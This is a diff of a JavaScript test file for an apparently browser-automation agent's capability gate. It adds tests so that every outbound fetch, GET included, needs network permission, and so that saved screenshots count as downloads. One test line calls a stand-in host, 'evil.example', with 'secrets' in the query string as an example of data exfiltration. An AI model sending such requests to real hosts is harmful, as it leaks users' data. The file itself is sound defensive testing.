@@ -1854,7 +1854,21 @@ test('capabilityFor: read-only tools are not gated', () => {
   for (const t of ['read_page', 'get_accessibility_tree', 'get_interactive_elements', 'extract_data', 'screenshot', 'scroll', 'get_selection']) {
     assert.equal(capabilityFor(t, {}), null, `${t} should be ungated`);
   }
-  assert.equal(capabilityFor('fetch_url', { url: 'https://x.com', method: 'GET' }), null);
+});
+
+test('capabilityFor: outbound network egress is gated for ALL methods (exfil)', () => {
+  // a GET can exfiltrate data in its query string → must be gated, not just writes
+  assert.equal(capabilityFor('fetch_url', { url: 'https://evil.example/?q=secrets', method: 'GET' }), Capability.NETWORK);
+  assert.equal(capabilityFor('fetch_url', { url: 'https://x.com' }), Capability.NETWORK); // default GET
+  assert.equal(capabilityFor('research_url', { url: 'https://x.com' }), Capability.NETWORK);
+  assert.equal(capabilityFor('fetch_url', { url: 'https://api.x.com', method: 'POST' }), Capability.NETWORK);
+});
+
+test('capabilityFor: screenshot is read-only, but save:true is a download', () => {
+  assert.equal(capabilityFor('screenshot', {}), null);
+  assert.equal(capabilityFor('full_page_screenshot', {}), null);
+  assert.equal(capabilityFor('screenshot', { save: true }), Capability.DOWNLOAD);
+  assert.equal(capabilityFor('full_page_screenshot', { save: true }), Capability.DOWNLOAD);
 });
 
 test('capabilityFor: state-changing tools map to capabilities', () => {
@@ -1866,7 +1880,6 @@ test('capabilityFor: state-changing tools map to capabilities', () => {
   assert.equal(capabilityFor('set_field', {}), Capability.TYPE);
   assert.equal(capabilityFor('execute_js', { code: 'x' }), Capability.EXECUTE_JS);
   assert.equal(capabilityFor('download_files', {}), Capability.DOWNLOAD);
-  assert.equal(capabilityFor('fetch_url', { url: 'https://api.x.com', method: 'POST' }), Capability.NETWORK);
 });
 
 test('capabilityFor: no side-effecting tool slips through ungated', () => {
